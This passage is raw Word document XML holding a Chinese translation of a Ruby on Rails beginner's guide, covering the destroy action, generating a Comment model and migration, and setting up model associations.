          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update_attributes</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且 应用 hash 字典的值到相应的记录。如果一切成功，用户会被重定向到 post 的 show 视图。如果期间发生了任何错误，它将回到 edit 视图并（要求）改正他们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEA4A80"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9.12 删除一个post</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7338F07B"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最后，点击一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 链接发送相关的id到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5616"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3651EC64" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A6E92B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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F00912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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43CDC1B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@post.destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="478C571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6DF5617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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79A841A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format.html { redirect_to posts_url }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46ECA65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format.json { head :no_content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7FB7759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3C26C49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7FE68FF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这个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是 Active Recordmodel 的实例（功能是）从数据库中移除相应的记录。当这个（操作）完成，这里没有任何记录显示，因此 Rails 重定向用户的浏览器到 model 的index view。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2EF10B"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10 添加第二个Model（comment）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E210E1"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你已经知道了通过scaffolding生成的model看起来是怎样的。第二个model用来处理blog post的评论。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AE786F"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10.1 构造一个model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614EF4F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Rails 中的 Models 使用一个单数名称，同时它们相关的数据库表使用一个复数名称。对于评论在 models 中的代名词，习惯上使用的的是 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Comment</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。即使你不想完完全全的使用 scaffolding，大多数的 Rails 仍然使用生成器来做这些事情比如 models 和 controllers。要创建一个新的 model，在终端中运行下面这条命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="49B85156" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D1996B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rails generate model Comment commenter:string body:text post:references</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F151C12"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这条命令将会生成四个文件：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5496"/>
        <w:gridCol w:w="3026"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5D07E017" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27E2B17D" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">File </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EBFBECF" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="37D5D76A" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="122CCAD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db/migrate/20100207235629_create_comments.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B6E76F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Migration to create the comments table in your database (your name will include a different timestamp) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6688FC07" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21B5CB8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app/models/comment.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="564D177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The Comment model </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="653A632E" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3039784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test/unit/comment_test.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27C9010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Unit testing harness for the comments model </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="2AB57757" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0BFBC78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test/fixtures/comments.yml </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="552294D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Sample comments for use in testing </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0EB02005"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首先，看一看 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>comment.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">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4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3CCEB284" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15C92A5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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Comment &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="616B4E1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belongs_to :post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C9F781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60A35994"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这和你刚刚看到 post.rb 很近似。不同的是这行 belongs_to :post，他会设定一个 Active Record association。你将会在接下来的 guide 学习一点有关 associations 的内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B0649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除了模型，Rails 同样也产生了一个 migration 来创建相应的数据库表单：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5736"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="53902550" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B110A2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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>CreateComments &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27BEF3F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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63A1883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create_table :comments</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46F2B49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t.string :commenter</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6807CBB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t.text :body</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E1E2B4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t.references :post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="366F24C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60E3966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t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="160EB82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4DBB80D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2D4B902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add_index :comments, :post_id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46E6EBC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23F044E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5BF44E45"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对于 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>t.references</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这行，会在两个 models 之间生成一个外键列从而形成一个关系（组合）。而且 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>add_index</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> line生成一个索引关联到这个关系行：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="2770B4F4" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="466B8F9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rake db:migrate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29DABC59"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Rails 能够智能的只针对对没有被运行过的表单，执行 migrations 生成当前的数据库，因此这里你只会看到：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3F28A58D" w14:textId="77777777" w:rsidTr="00877F53">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="477875A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CreateComments: migrating =================================================</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="734660E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create_table(:comments)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E008AE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-&gt; 0.0008s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25DEC6F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add_index(:comments, :post_id)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E83F15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-&gt; 0.0003s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56CE308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CreateComments: migrated (0.0012s) ========================================</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1563EB64"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10.2 Associating Models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354A14A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Active Record associations让你很容易的申明两个models之间的关系。在本例中的comments和posts，你可以写出这样描述关系：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7606FC6B" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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一条comment对应于一个post。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050E8617" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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一个post可以对应于多个comments。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193AE584"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实际上，这与接近 Rails 声明的 这个关系的语句语义 。你已经看到了在 Comment model 中的使每个 comment对应于一个 post的代码。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5DFC7DAC" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0383C58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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Comment &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="713DBE4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belongs_to :post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68BAB69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3A6E2B1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你将会需要编辑 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件来添加另一半关系。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8496"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3BA08072" w14:textId="77777777" w:rsidTr="00692ED5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F78EC8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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D15B2B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attr_accessible :content, :name, :title</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54768DA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validates :name,  :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6325BBE0" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="00692ED5">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
